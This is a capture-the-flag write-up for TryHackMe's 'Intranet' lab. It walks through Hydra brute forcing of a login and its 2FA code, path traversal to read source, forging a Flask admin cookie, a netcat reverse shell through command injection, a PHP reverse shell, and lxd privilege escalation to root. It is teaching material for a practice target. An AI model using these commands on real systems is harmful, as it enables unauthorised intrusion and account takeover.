# THM - Intranet writeup

## Flag 1: go through login page

Let's start to enumerate services on the target.
```
$ nmap -sV 10.10.247.142
```
We can find
* Echo service on port 7
* FTP service on port 21
* SSH service on port 22
* Telnet service on port 23
* HTTP service on port 80
* HTTP service (again) on port 8080

Let's have a look at each.
* FTP: anonymous is not allowed.
* HTTP 80: nothing
* HTTP 8080: a login page.

Looking at the source code, there are low-hanging fruits : there is someone called anders, and an account devops.

Also, if we try to login with random password and login 
* devops@securesolacoders.no --> we have invalid password
* anders --> invalid **login** 
* anders@securesolacoders.no --> invalid **password**
* test@securesolacoders.no --> invalid **login** 
* admin@securesolacoders.no --> invalid **password**

We found a few usernames (anders, devops, admin).

Let's Hydra-te this.

With rockyou.txt, it takes forever... ok, we need to try something else.

Let's generate random passwords ([here](https://zzzteph.github.io/weakpass/generator/)) with keywords anders, senior, developer, devops, admin, securesolacoders, and Hydra-te again : there are bazillion of findings !

Having a deeper look at the website, we can see that some chars are forbidden (hence, the false positive findings): we need to remove
```
& " ' #
```
Let's go
```
$ cat passwords.txt| grep -vE "['#\"&]" > passwords.filtered  
$ hydra -L logins.txt -P passwords.filtered -s 8080 10.10.247.142 http-post-form "/login:username=^USER^@securesolacoders.no&password=^PASS^:Invalid"

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-06-19 18:33:09  
[DATA] max 16 tasks per 1 server, overall 16 tasks, 3000 login tries (l:3/p:1000), ~188 tries per task  
[DATA] attacking http-post-form://10.10.247.142:8080/login:username=^USER^@securesolacoders.no&password=^PASS^:Invalid  
[8080][http-post-form] host: 10.10.247.142 login: _REDACTED_ password: _REDACTED_
1 of 1 target successfully completed, 1 valid password found  
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-06-19 18:33:46
```
And this time, we got one ! Let's connect : we have a flag... and a 2FA validation.

## Flag 2: 2FA validation

It seems that it expects a 4-digit number, we can try to bruteforce it with Hydra (again - oh and add your cookie if you want to reach the SMS page !)
```
# Generate all numbers in a file
$ seq 10000 19999|sed 's/1//' > codes.txt

$ hydra -l _REDACTED_ -P codes.txt -s 8080 10.10.247.142 http-post-form "/sms:sms=^PASS^:Invalid:H=Cookie: session=_REDACTED_"  
[8080][http-post-form] host: 10.10.247.142 login: _REDACTED_ password: 2874  
```
Hydra found the OTP ! (note: it's a random number, it changes every time...)

Oh, and we have another flag.

## Flag 3: get app source code

Now, let's have a look at the website.

Nothing interesting, except the Internal News section, and its button. If we curl that, we can play with news' value.
```
$ curl 'http://10.10.247.142:8080/internal' -X POST \  
-H 'Cookie: session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYW5kZXJzIn0.ZJCgxg.Eqi1fO3hRSnO0JDmoj0FwgvogbM'\  
--data-raw 'news=latest'
```
* Any other value causes an error 500 🤔
* /etc/passwd as well
* ../../etc/passwd --> it works

So we can basically reads some files on the server. The most interesting one is probably /proc/self/cmdline: we know (from Nmap) that this website is running under Python, we'll be able to see the source code !

```
$ curl 'http://10.10.247.142:8080/internal' -X POST \  
-H 'Cookie: session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYW5kZXJzIn0.ZJCgxg.Eqi1fO3hRSnO0JDmoj0FwgvogbM'\  
--data-raw 'news=../../proc/self/cmdline' -s | sed '1,/<.form>/d;/div/,$d'  
  
  
/usr/bin/python3/home/devops/app.py
```
The script is /home/devops/app.py -- and we can probably get it as well :
```
$ curl 'http://10.10.247.142:8080/internal' -X POST \  
-H 'Cookie: session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYW5kZXJzIn0.ZJCgxg.Eqi1fO3hRSnO0JDmoj0FwgvogbM'\  
--data-raw 'news=../../home/devops/app.py' -s \  
| sed '1,/<.form>/d;/div/,$d;s/&#34;/"/g' > app.py
```

Findings :
* There is a flag 😂 
* It uses Flask
* We found the 3 only users -- and only one had a password
* It's not possible to be an admin
* The admin section is restricted to the admin

## Flag 4: be an admin 

So: how the hell can we be an admin if it's not implemented ???

The answer is: we may craft a cookie for that !

Flask sessions contains parameters in the cookie, which is an equivalent of a JWT token : world-readable, but signed by a secret.

And... we know the secret ! It's in the file ... almost 😞 
```
key = "secret_key_" + str(random.randrange(100000,999999))
```
Let's use a dedicated tool for that :
```
$ pip install flask-unsign

$ /usr/local/bin/flask-unsign -d -c eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYW5kZXJzIn0.ZJCgxg.Eqi1fO3hRSnO0JDmoj0FwgvogbM  
{'logged_in': True, 'username': '_REDACTED_'}

# Generate all possible keys
$ seq 100000 999999 | sed 's/^/secret_key_/' > keys.txt

$ /usr/local/bin/flask-unsign -u -c eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYW5kZXJzIn0.ZJCgxg.Eqi1fO3hRSnO0JDmoj0FwgvogbM -w keys.txt  
[*] Session decodes to: {'logged_in': True, 'username': 'anders'}  
[*] Starting brute-forcer with 8 threads..  
[+] Found secret key after 779392 attempts  
'secret_key_879207'
# Note: it changes every time...

$ /usr/local/bin/flask-unsign --sign --secret secret_key_879207 -c "{'logged_in': True, 'username': 'admin'}"  
eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYWRtaW4ifQ.ZJCmFA.c2GtwbT7Zn3QtuSMKtiGcMp9lGQ
```

Now, with this admin-crafted cookie, we can access the admin page and the 4th flag.

## Flag 5: open a shell

Another interesting thing in the source code is, for /admin :
```
if request.method == "POST":  
os.system(request.form["debug"])
```
Let's play with that and ask for... a reverse shell !!
```
#Note: replace & by %26 !!!

$ curl 'http://10.10.247.142:8080/admin' -X POST \  
-H 'Cookie: session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYWRtaW4ifQ.ZJCmjg.4BeS36_PuOAAzokuPGBT5PD93Cs'\  
--data-raw 'debug=rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>%261|nc 10.10.176.115 4242 >/tmp/f'
```

```
$ nc -nlvp 4242  
listening on [any] 4242 ...  
connect to [10.10.176.115] from (UNKNOWN) [10.10.247.142] 52588  
/bin/sh: 0: can't access tty; job control turned off  
$ id  
uid=1001(devops) gid=1001(devops) groups=1001(devops)
```
Here is our shell ! 🎉 🎉 🎉 

_Note: don't forget to grab /home/devops/user.txt 's flag_

## Flag 6: pivoting to anders

Next step: pivoting (privesc to root is still unachievable). Let's pivot to _anders_, starting with his running processes
```
$ ps -ef | grep anders
anders 776 753 0 18:18 ? 00:00:00 /usr/sbin/apache2 -k start  
anders 777 753 0 18:18 ? 00:00:00 /usr/sbin/apache2 -k start  
anders 778 753 0 18:18 ? 00:00:00 /usr/sbin/apache2 -k start  
anders 779 753 0 18:18 ? 00:00:00 /usr/sbin/apache2 -k start  
anders 780 753 0 18:18 ? 00:00:00 /usr/sbin/apache2 -k start  
devops 13421 13329 0 19:08 ? 00:00:00 grep anders
```

So, anders is running Apache2. Remember ? there was a web server on 80 !

Let's generate a php reverse shell : 
```
$ msfvenom -p php/reverse_php -o shell.php
```
Now, put it on the remote /var/www/html, open a listener, and browse the page /shell.php :
```
$ nc -nlvp 4444  
listening on [any] 4444 ...  
connect to [10.10.176.115] from (UNKNOWN) [10.10.247.142] 50406  
id  
uid=1000(anders) gid=1000(anders) groups=1000(anders),24(cdrom),27(sudo),30(dip),46(plugdev)
```
Another shell, another user (and another flag)

_Note: be kind with yourself and put your public key in /home/anders/.ssh/authorized_keys_ 

## Flag 7: Privesc with lxd

Root privilege escalation... This one is tricky.
* First, sudo tells us that we can restart apache2
```
anders@workshop:~$ sudo -ln  
Matching Defaults entries for anders on workshop:  
env_reset, mail_badpass,  
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin  
  
User anders may run the following commands on workshop:  
(ALL) NOPASSWD: /sbin/service apache2 restart
```
* Then, we cannot update the service definition... but we can update /etc/apache2/envvars, especially
```
export APACHE_RUN_USER=anders  
export APACHE_RUN_GROUP=anders
```
* We cannot set USER to root - it won't work. But we can set GROUP to whatever we want. I suggest to use lxd (we saw in /etc/passwd that user exists, and you can double-check that group exists if you look at /etc/group)
* 
* Now, restart apache2 (using sudo), reopen the listener and the shell.php page :
```
$ id
uid=1000(anders) gid=116(lxd) groups=116(lxd),24(cdrom),27(sudo),30(dip),46(plugdev)
```

We are anders, again, but with gid lxd.

Now, we can just apply the [exploit described here](https://www.exploit-db.com/exploits/46978), to end with a root access on the drive :

* Get the alpine image on our machine
* Build it
* Send both script and alpine.tgz to the target
* Run script
* And... 
```
~ # ^[[31;5Rcd /mnt/root/root  
cd /mnt/root/root  
/mnt/root/root # ^[[31;18Rcat root.txt  
cat root.txt  
__REDACTED__
```
Voilà !
